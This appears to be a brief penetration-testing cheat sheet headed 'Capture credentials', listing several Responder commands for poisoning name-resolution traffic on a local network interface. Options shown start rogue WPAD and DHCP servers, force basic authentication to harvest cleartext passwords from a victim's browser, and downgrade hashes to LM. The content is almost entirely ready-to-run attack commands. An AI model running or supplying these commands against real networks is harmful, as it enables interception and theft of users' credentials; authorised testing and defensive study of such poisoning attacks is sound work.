
Capture credentials :

using Responsder :
```bash
responder -I eth0
sudo responder -I eth0 -dwPv
responder -I eth0 -wd  #Starting wpad and DHCP server.
responder -I eth0 -A
responder -I eth0 -wdF -b #get clear text password , in victum browser run fun.local
responder -I eth0 -e 192.168.1.2
responder -I eth0 -wdF --lm --disable-es
```